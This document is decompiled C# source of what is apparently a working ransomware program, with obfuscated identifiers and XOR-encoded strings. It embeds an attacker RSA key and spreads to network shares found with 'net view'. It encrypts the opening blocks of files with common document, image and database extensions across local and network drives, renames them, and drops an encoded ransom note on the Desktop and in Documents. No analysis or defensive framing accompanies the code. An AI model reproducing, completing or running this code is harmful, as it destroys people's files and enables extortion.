using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace altappa;

public class Form1 : Form
{
	private byte m_a = 156;

	private int m_b = 245;

	private int m_c = 3;

	private string m_d = "";

	private string m_e;

	private string m_f = "";

	private string m_g = "";

	private string m_h = "\\\\\\\\\\\\\\\\\\";

	private byte[] i;

	private List<string> j = new List<string>();

	private List<string> k = new List<string>();

	private List<string> l = new List<string>();

	private string m = "";

	private string n;

	private IContainer o = null;

	public Form1()
	{
		a();
		if (!g())
		{
			h();
		}
	}

	private void h()
	{
		f();
		d();
		c();
		b();
	}

	private bool g()
	{
		bool result = false;
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		if (processesByName.Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void f()
	{
		byte[] a_ = new byte[13]
		{
			189, 206, 217, 221, 216, 188, 209, 217, 189, 178,
			232, 228, 232
		};
		byte[] a_2 = new byte[415]
		{
			160, 206, 207, 221, 215, 249, 229, 202, 253, 240,
			233, 249, 162, 160, 209, 243, 248, 233, 240, 233,
			239, 162, 240, 211, 246, 211, 179, 183, 238, 173,
			241, 202, 202, 214, 241, 242, 213, 204, 250, 249,
			169, 240, 170, 198, 248, 171, 250, 173, 223, 245,
			165, 241, 216, 207, 237, 213, 204, 223, 211, 240,
			217, 207, 247, 216, 236, 198, 197, 237, 230, 234,
			179, 241, 228, 254, 255, 221, 238, 241, 228, 250,
			216, 229, 183, 212, 237, 174, 238, 198, 229, 245,
			221, 245, 254, 238, 209, 203, 215, 234, 213, 243,
			247, 211, 219, 200, 169, 175, 230, 237, 230, 221,
			210, 216, 239, 236, 202, 233, 243, 216, 228, 198,
			235, 169, 217, 228, 251, 223, 203, 233, 223, 246,
			208, 235, 222, 165, 251, 246, 230, 243, 196, 232,
			222, 202, 222, 203, 173, 233, 230, 235, 217, 202,
			168, 210, 212, 175, 237, 246, 206, 216, 197, 202,
			207, 212, 253, 244, 232, 253, 209, 215, 239, 169,
			254, 217, 239, 238, 198, 218, 228, 170, 222, 215,
			222, 197, 179, 228, 208, 204, 171, 249, 247, 175,
			253, 218, 237, 247, 217, 245, 173, 165, 198, 203,
			230, 205, 183, 234, 228, 174, 245, 200, 173, 232,
			219, 222, 205, 241, 253, 242, 200, 233, 254, 201,
			218, 230, 239, 211, 241, 246, 179, 169, 236, 215,
			206, 165, 175, 241, 214, 232, 244, 253, 222, 183,
			214, 219, 210, 218, 213, 236, 217, 204, 239, 234,
			174, 243, 255, 203, 183, 173, 235, 172, 229, 218,
			198, 203, 216, 168, 233, 204, 229, 228, 197, 232,
			216, 246, 254, 230, 234, 215, 170, 201, 242, 205,
			235, 217, 229, 228, 240, 251, 255, 213, 233, 211,
			169, 234, 243, 249, 197, 236, 238, 179, 235, 214,
			247, 205, 174, 179, 221, 230, 172, 205, 246, 168,
			237, 242, 198, 202, 239, 208, 238, 223, 251, 215,
			218, 243, 203, 228, 215, 239, 232, 201, 250, 200,
			253, 217, 164, 244, 209, 171, 243, 232, 202, 183,
			170, 196, 168, 206, 165, 243, 245, 241, 211, 213,
			240, 236, 206, 203, 172, 236, 234, 183, 175, 171,
			174, 164, 255, 205, 161, 161, 160, 179, 209, 243,
			248, 233, 240, 233, 239, 162, 160, 217, 228, 236,
			243, 242, 249, 242, 232, 162, 221, 205, 221, 222,
			160, 179, 217, 228, 236, 243, 242, 249, 242, 232,
			162, 160, 179, 206, 207, 221, 215, 249, 229, 202,
			253, 240, 233, 249, 162
		};
		this.m_f = a(a_2, this.m_a);
		n = "ҎҬӔҤ¼ӘҬҥҧӗ¼ҫҬӔҤӘӜҢҮҬҡӗ¼ӝ¼ҤӝңҢҧӐҫҢҮҬҡҤҩҠ¼ҦӜҤңӞҢӝӞҢҥҦҢүҢ¼ҬҧүҢӜҤӞҠҬ¼ÎÏÝ±®¬\u00a8¤²¼\u0091\u0096\u0489ӝҧҤ¼әҢӞҤӞҩ¼Ҥә¼ҮҩӜҡӟӞӐ¼ҢӞңӜҬҮӐӞҩ¼ҢҨҤҡ¼Ҥҫ¼ҫҬӔҤӘӜҢҮҬҡҡӗә¼ӘҬҥҧҢҮ¼ҡҬ¼ù±ñýõð¦¼éòðÿ÷îÜìîóèóòñýõð²ÿóñ¼\u0091\u0096\u0489ӝҧҤ¼Үӗ¼ҡҩ¼ңҢҧӟӛҤҧҤ¼ҢӞҮҩӞҬ¼Ү¼ӞҩӛҩҡҤҩ¼ӝӟӞҢҦ¼ӞҢ¼ӝҦҬӛҬҥӞҩ¼ӝ¼ӝҬҥӞҬ¼ëëë²èóîìîóöùÿè²ÿóò¼ҭӜҬӟҫҩӜ¼¼ÈÓÎ¼\u0091\u0096Ҥ¼ӝ¼ҩүҢ¼ңҢҠҢӕӐӒ¼ҫҬҥҨҤӞҩ¼ҡҬ¼ӝҬҥӞ¦¼ôèèì¦³³ò\u00afî®÷éæôë®ô«äªö©²óòõóò¼¼±¼¼ӞҬҠ¼ҭӟҨҩӞ¼ӟҦҬҫҬҡ¼ҨҩҥӝӞҮӟӒӕҤҥ¼ңҢӛӞҢҮӗҥ¼ӓӕҤҦ²¼\u0091\u0096\u0483ҢңӗӞҦҤ¼ӝҬҠҢӝӞҢӓӞҩҧӐҡҢүҢ¼ҮҢӝӝӞҬҡҢҮҧҩҡҤӓ¼ӘҬҥҧҢҮ¼ҠҢүӟӞ¼ҭҩҫҮҢҫҮӜҬӞҡҢ¼Ҥә¼ҤӝңҢӜӞҤӞӐ½";
		string text = a(a_, this.m_a);
		m = a(a_, this.m_a);
		this.m_e = "_";
		Random random = new Random();
		random.Next(97, 122);
		for (int i = 0; i < 1; i++)
		{
			this.m_e += Convert.ToChar(random.Next(97, 122));
		}
		this.m_e = this.m_e + Convert.ToChar(random.Next(97, 122)).ToString() + Convert.ToChar(random.Next(97, 122)).ToString() + (DateTime.Now.Day + 20).ToString() + Convert.ToChar(random.Next(97, 122)).ToString() + Convert.ToChar(random.Next(97, 122)).ToString() + (int)Convert.ToChar(random.Next(97, 122)) + Convert.ToChar(random.Next(97, 122)).ToString() + (DateTime.Now.Month + 10).ToString() + Convert.ToChar(random.Next(97, 122)).ToString();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		j.Add(folderPath.ToLower());
		j.Add(folderPath2.ToLower());
		j.Add(a(new byte[8] { 206, 217, 223, 197, 223, 208, 217, 206 }, this.m_a));
		j.Add(a(new byte[12]
		{
			184, 206, 217, 223, 197, 223, 208, 217, 178, 222,
			213, 210
		}, this.m_a));
		j.Add(a(new byte[25]
		{
			207, 229, 239, 232, 249, 241, 188, 202, 243, 240,
			233, 241, 249, 188, 213, 242, 250, 243, 238, 241,
			253, 232, 245, 243, 242
		}, this.m_a));
		k.Add(a(new byte[3] { 178, 255, 248 }, this.m_a));
		k.Add(a(new byte[4] { 178, 240, 248, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 241, 248, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 241, 253, 228 }, this.m_a));
		k.Add(a(new byte[4] { 178, 248, 254, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 249, 236, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 173, 255, 248 }, this.m_a));
		k.Add(a(new byte[3] { 178, 241, 248 }, this.m_a));
		k.Add(a(new byte[3] { 178, 248, 254 }, this.m_a));
		k.Add(a(new byte[4] { 178, 236, 248, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 236, 236, 232 }, this.m_a));
		k.Add(a(new byte[4] { 178, 228, 240, 239 }, this.m_a));
		k.Add(a(new byte[4] { 178, 248, 243, 255 }, this.m_a));
		k.Add(a(new byte[4] { 178, 253, 238, 246 }, this.m_a));
		k.Add(a(new byte[4] { 178, 232, 253, 238 }, this.m_a));
		k.Add(a(new byte[3] { 178, 171, 230 }, this.m_a));
		k.Add(a(new byte[4] { 178, 238, 253, 238 }, this.m_a));
		k.Add(a(new byte[4] { 178, 230, 245, 236 }, this.m_a));
		k.Add(a(new byte[4] { 178, 232, 245, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 246, 236, 251 }, this.m_a));
		k.Add(a(new byte[3] { 178, 253, 245 }, this.m_a));
		k.Add(a(new byte[4] { 178, 254, 241, 236 }, this.m_a));
		k.Add(a(new byte[4] { 178, 236, 242, 251 }, this.m_a));
		k.Add(a(new byte[4] { 178, 255, 248, 238 }, this.m_a));
		k.Add(a(new byte[4] { 178, 236, 239, 248 }, this.m_a));
		k.Add(a(new byte[5] { 178, 246, 236, 249, 251 }, this.m_a));
		k.Add(a(new byte[5] { 178, 248, 243, 255, 228 }, this.m_a));
		k.Add(a(new byte[5] { 178, 228, 240, 239, 228 }, this.m_a));
		k.Add(a(new byte[5] { 178, 236, 236, 232, 228 }, this.m_a));
		k.Add(a(new byte[6] { 178, 253, 255, 255, 248, 254 }, this.m_a));
		k.Add(a(new byte[4] { 178, 241, 248, 254 }, this.m_a));
		k.Add(a(new byte[4] { 178, 238, 232, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 243, 248, 232 }, this.m_a));
		k.Add(a(new byte[4] { 178, 243, 248, 239 }, this.m_a));
		k.Add(a(new byte[4] { 178, 243, 248, 254 }, this.m_a));
		k.Add(a(new byte[4] { 178, 243, 248, 251 }, this.m_a));
		k.Add(a(new byte[4] { 178, 255, 238, 174 }, this.m_a));
		k.Add(a(new byte[4] { 178, 242, 249, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 242, 238, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 243, 238, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 253, 238, 235 }, this.m_a));
		k.Add(a(new byte[4] { 178, 239, 238, 174 }, this.m_a));
		k.Add(a(new byte[4] { 178, 239, 238, 250 }, this.m_a));
		k.Add(a(new byte[4] { 178, 248, 235, 251 }, this.m_a));
		k.Add(a(new byte[4] { 178, 248, 228, 250 }, this.m_a));
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		this.m_d = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		this.m_g = a(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
		this.i = b(this.m_g);
		e();
	}

	private void e()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex == -1)
				{
					break;
				}
				num = text.IndexOf(' ', startIndex);
				list.Add(text.Substring(startIndex, num - startIndex));
				startIndex = num;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string @string = Encoding.GetEncoding("CP866").GetString(bytes);
				string[] array = @string.Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						l.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private static string a(string A_0, byte A_1)
	{
		string text = "";
		char[] array = A_0.ToCharArray();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (char)(array[i] ^ A_1);
			text += char.ToString(array[i]);
		}
		return text;
	}

	private byte[] b(string A_0)
	{
		A_0 += this.m_h;
		return Encoding.Default.GetBytes(A_0);
	}

	private string a(string A_0)
	{
		string text = "";
		byte[] array = new byte[A_0.Length];
		byte[] array2 = new byte[this.m_b];
		byte[] array3 = new byte[this.m_b + 11];
		double num = Math.Ceiling((double)A_0.Length / (double)this.m_b);
		if ((double)A_0.Length < num * (double)this.m_b)
		{
			int length = A_0.Length;
			for (int i = 0; (double)i < num * (double)this.m_b - (double)length; i++)
			{
				A_0 += " ";
			}
		}
		array = Encoding.Default.GetBytes(A_0);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(this.m_f);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * this.m_b, array2, 0, this.m_b);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
		}
		catch
		{
		}
		return text;
	}

	private void d()
	{
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		for (int i = 0; i < list.Count; i++)
		{
			File.WriteAllText(list[i] + "\\" + m, a(n, this.m_a));
		}
	}

	private void c()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					b(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void b(DirectoryInfo A_0)
	{
		try
		{
			DirectoryInfo[] directories = A_0.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo a_ in array)
			{
				a(a_);
				b(a_);
			}
		}
		catch
		{
		}
	}

	private void a(DirectoryInfo A_0)
	{
		try
		{
			string[] files = Directory.GetFiles(A_0.FullName, "*.*");
			string[] array = files;
			foreach (string text in array)
			{
				foreach (string item in k)
				{
					if (text.ToLower().IndexOf(item) != -1)
					{
						string a_ = text;
						if (text.IndexOf(m) == -1)
						{
							a(a_, item);
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	private void b()
	{
		for (int i = 0; i < l.Count; i++)
		{
			DirectoryInfo a_ = new DirectoryInfo(l[i].ToString());
			b(a_);
		}
	}

	private void a(string A_0, string A_1)
	{
		byte[] array = new byte[this.m_b];
		int num = 0;
		string text = "";
		try
		{
			byte[] array2 = File.ReadAllBytes(A_0);
			if (array2.Length / (this.m_c + 5) >= this.m_b)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(this.m_d);
				byte[] array3 = new byte[array2.Length + this.m_c * 11 + this.i.Length];
				Array.Copy(this.i, array3, this.i.Length);
				byte[] array4 = new byte[array2.Length - this.m_c * this.m_b];
				for (int i = 0; i < this.m_c; i++)
				{
					Array.Copy(array2, this.m_b * i, array, 0, this.m_b);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, this.i.Length + i * (this.m_b + 11), array5.Length);
				}
				Array.Copy(array2, this.m_c * this.m_b, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, this.i.Length + this.m_c * (this.m_b + 11), array4.Length);
				try
				{
					File.WriteAllBytes(A_0, array3);
					num = A_0.IndexOf(A_1);
					text = A_0.Insert(num, this.m_e);
					File.Move(A_0, text);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private string a(byte[] A_0, int A_1)
	{
		string text = "";
		byte[] array = new byte[A_0.Length];
		for (int i = 0; i < A_0.Length; i++)
		{
			array[i] = (byte)(A_0[i] ^ A_1);
		}
		return text = Encoding.Default.GetString(array);
	}

	private void a(object A_0, EventArgs A_1)
	{
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && o != null)
		{
			o.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void a()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
